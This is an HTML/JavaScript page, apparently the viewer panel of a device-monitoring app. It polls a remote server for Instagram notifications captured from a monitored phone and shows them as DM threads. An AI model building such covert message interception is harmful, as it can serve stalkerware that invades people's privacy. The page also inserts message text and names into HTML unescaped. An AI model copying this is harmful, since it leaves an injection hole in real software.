<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram DM Monitor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- INSTAGRAM DARK THEME --- */
        body { 
            margin: 0; 
            background-color: #000; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            color: #fff; 
            height: 100vh; 
            overflow: hidden; 
            display: flex;
            justify-content: center;
        }

        .app-container {
            width: 100%;
            height: 100%;
            max-width: 450px;
            background-color: #000;
            position: relative;
            display: flex;
            flex-direction: column;
        }

        /* --- VIEW 1: DM LIST --- */
        #dmListView { display: flex; flex-direction: column; height: 100%; width: 100%; }

        .dm-header { 
            padding: 15px; display: flex; justify-content: space-between; align-items: center; height: 40px;
        }
        .username-top { font-weight: bold; font-size: 1.2rem; display: flex; align-items: center; gap: 5px; cursor: pointer; }
        .header-icons { display: flex; gap: 20px; font-size: 1.4rem; }
        
        .search-box { padding: 0 15px 10px 15px; }
        .search-input { width: 100%; background: #262626; border: none; padding: 8px 10px; border-radius: 10px; color: #a8a8a8; outline: none; box-sizing: border-box; }

        .dm-list { flex: 1; overflow-y: auto; padding-top: 5px; }
        
        .dm-item { 
            display: flex; align-items: center; padding: 10px 15px; cursor: pointer; transition: 0.2s; 
        }
        .dm-item:active { background: #1a1a1a; }

        .insta-dp { width: 54px; height: 54px; border-radius: 50%; background: #333; margin-right: 15px; overflow: hidden; display: flex; justify-content: center; align-items: center; font-size: 1.5rem; color: #888; border: 1px solid #333; }
        
        .dm-info { flex: 1; }
        .dm-info h4 { margin: 0; font-weight: 400; font-size: 0.95rem; color: #fff; }
        .dm-info p { margin: 3px 0 0; color: #a8a8a8; font-size: 0.85rem; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden;}
        .time-badge { font-size: 0.7rem; color: #666; margin-left: 5px; }

        .camera-icon { margin-left: auto; color: #a8a8a8; font-size: 1.4rem; }

        /* --- VIEW 2: CHAT DETAIL --- */
        #chatView { 
            display: none; 
            flex-direction: column; height: 100%; 
            background: #000; 
            position: absolute; top: 0; left: 0; width: 100%; 
            z-index: 20; 
        }

        .chat-nav { 
            padding: 10px 15px; display: flex; align-items: center; 
            border-bottom: 1px solid #262626; height: 40px;
        }
        
        .chat-area { 
            flex: 1; padding: 15px; overflow-y: auto; 
            display: flex; flex-direction: column; gap: 4px; 
        }
        
        .msg { padding: 10px 16px; border-radius: 22px; max-width: 70%; font-size: 0.95rem; margin-bottom: 2px; line-height: 1.4; word-wrap: break-word;}
        
        .msg-in { 
            background: #262626; align-self: flex-start; color: #fff; border-bottom-left-radius: 5px;
        }
        .msg-time { font-size: 0.65rem; color: #888; display: block; margin-top: 5px; text-align: right;}

        .chat-input { padding: 15px; display: flex; align-items: center; gap: 15px; }
        .pill { flex: 1; background: #262626; padding: 12px 20px; border-radius: 25px; color: #fff; border: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }

    </style>
</head>
<body>

    <div class="app-container">

        <div id="dmListView">
            <div class="dm-header">
                <div class="username-top" onclick="window.location.href='index.html'">
                    <i class="fa-solid fa-arrow-left"></i>
                    <span style="margin-left:10px">Instagram Direct</span> 
                </div>
                <div class="header-icons">
                    <i class="fa-solid fa-video"></i>
                    <i class="fa-regular fa-pen-to-square"></i>
                </div>
            </div>
            
            <div class="search-box">
                <input type="text" class="search-input" placeholder="Search">
            </div>

            <div class="dm-list" id="instaList">
                <div style="display:flex; justify-content:center; align-items:center; height:200px; color:#555;">
                    <i class="fa-solid fa-spinner fa-spin" style="font-size:20px; margin-right:10px;"></i> Loading...
                </div>
            </div>
        </div>

        <div id="chatView">
            <div class="chat-nav">
                <i class="fa-solid fa-arrow-left" style="font-size:1.5rem; margin-right:20px; cursor:pointer;" onclick="closeInstaChat()"></i>
                <div class="insta-dp" style="width:30px; height:30px; margin-right:10px; font-size: 1rem;">
                    <i class="fa-solid fa-user"></i>
                </div>
                <div style="flex:1;">
                    <div style="font-weight:600; font-size: 0.95rem;" id="instaChatName">User</div>
                    <div style="font-size: 0.75rem; color: #a8a8a8;">Active today</div>
                </div>
                <i class="fa-solid fa-phone" style="font-size:1.4rem; margin-right:20px"></i>
                <i class="fa-solid fa-video" style="font-size:1.4rem"></i>
            </div>
            
            <div class="chat-area" id="instaMsgs">
            </div>
            
            <div class="chat-input">
                <div class="pill">
                    <span style="color:#ddd">Message...</span>
                    <i class="fa-regular fa-image" style="color:#fff"></i>
                </div>
            </div>
        </div>

    </div>

    <script>
        // --- CONFIG ---
        const DEVICE_ID = localStorage.getItem('monitoring_id');
        const BASE_URL = "https://child-v9no.onrender.com/api/get-data"; 
        
        // ðŸ”¥ UPDATE: Specifically requesting 'instagram' file
        const DATA_TYPE = "instagram";

        if (!DEVICE_ID) {
            alert("Device ID Missing!");
            window.location.href = 'index.html'; 
        }

        let groupedInsta = {}; 

        // --- 1. FETCH DATA ---
        async function fetchInstaData() {
            try {
                // REST API Call: /api/get-data/ID/instagram
                const finalUrl = `${BASE_URL}/${DEVICE_ID}/${DATA_TYPE}`;
                
                const response = await fetch(finalUrl);
                const result = await response.json();

                if (Array.isArray(result) && result.length > 0) {
                    processInstaData(result);
                } else {
                    document.getElementById('instaList').innerHTML = "<p style='text-align:center; color:#444; margin-top:20px'>No Instagram Data Yet</p>";
                }
            } catch (error) {
                console.error("Fetch Error:", error);
            }
        }

        // --- 2. INTELLIGENT PROCESSING ---
        function processInstaData(logs) {
            groupedInsta = {}; 
            
            // Step A: Logs ko Time ke hisab se sort karo (Oldest First for chat history)
            logs.sort((a, b) => (a.time || 0) - (b.time || 0));

            logs.forEach(log => {
                let rawTitle = (log.title || "").trim();
                let rawText = (log.text || "").trim();
                let time = log.time || Date.now();

                // --- GARBAGE FILTER ---
                if (rawText.includes("checking for new messages") || rawText.includes("running")) return;

                let senderName = "Unknown";
                let messageBody = rawText;

                // --- LOGIC: IDENTIFY SENDER ---
                // Case 1: Title is "Instagram" -> Usually a system notification or hidden sender
                if (rawTitle === "Instagram") {
                    if (rawText.includes(":")) {
                        // Ex: "John: Hello" -> Sender: John, Msg: Hello
                        let parts = rawText.split(":");
                        senderName = parts[0].trim();
                        messageBody = parts.slice(1).join(":").trim();
                    } else {
                        // Ex: "3 new messages" -> System Notification
                        senderName = "System Notifications";
                    }
                } 
                // Case 2: Title is the User Name (Standard DM)
                else {
                    senderName = rawTitle;
                }

                // --- GROUPING ---
                if (!groupedInsta[senderName]) {
                    groupedInsta[senderName] = {
                        name: senderName,
                        lastMsg: "",
                        lastTime: 0,
                        msgs: []
                    };
                }

                // Add to list
                groupedInsta[senderName].msgs.push({
                    text: messageBody,
                    timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                    rawTime: time
                });

                // Update Preview
                groupedInsta[senderName].lastMsg = messageBody;
                groupedInsta[senderName].lastTime = time;
            });

            renderInstaList();
        }

        // --- 3. RENDER LIST ---
        function renderInstaList() {
            const list = document.getElementById('instaList');
            const userNames = Object.keys(groupedInsta);

            if(userNames.length === 0) {
                list.innerHTML = "<p style='text-align:center; color:#555; margin-top:20px'>No Chats Found</p>";
                return;
            }

            // SORTING: Jiski chat abhi aayi hai wo sabse upar (Newest LastTime First)
            userNames.sort((a, b) => groupedInsta[b].lastTime - groupedInsta[a].lastTime);

            let html = "";
            userNames.forEach(user => {
                const u = groupedInsta[user];
                
                // Icon selection: System vs User
                let icon = '<i class="fa-solid fa-user"></i>';
                if(user === "System Notifications") icon = '<i class="fa-solid fa-bell" style="color:#e1306c"></i>';

                html += `
                    <div class="dm-item" onclick="openInstaChat('${user}')">
                        <div class="insta-dp">${icon}</div>
                        <div class="dm-info">
                            <div style="display:flex; justify-content:space-between; width:100%">
                                <h4>${u.name}</h4>
                                <span class="time-badge">${new Date(u.lastTime).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
                            </div>
                            <p>${u.lastMsg}</p>
                        </div>
                        <i class="fa-solid fa-camera camera-icon"></i>
                    </div>`;
            });
            
            list.innerHTML = html;
        }

        // --- 4. CHAT VIEW ---
        function openInstaChat(userName) {
            const u = groupedInsta[userName];
            if(!u) return;

            document.getElementById('instaChatName').innerText = u.name;
            const box = document.getElementById('instaMsgs');
            box.innerHTML = "";
            
            // Messages are already sorted Old -> New in Process function
            u.msgs.forEach(m => {
                box.innerHTML += `
                    <div class="msg msg-in">
                        ${m.text}
                        <span class="msg-time">${m.timeStr}</span>
                    </div>`;
            });

            document.getElementById('dmListView').style.display = 'none';
            document.getElementById('chatView').style.display = 'flex';
            box.scrollTop = box.scrollHeight;
        }

        function closeInstaChat() {
            document.getElementById('chatView').style.display = 'none';
            document.getElementById('dmListView').style.display = 'flex';
        }

        // Auto Refresh
        fetchInstaData();
        setInterval(fetchInstaData, 5000);

    </script>
</body>
</html>
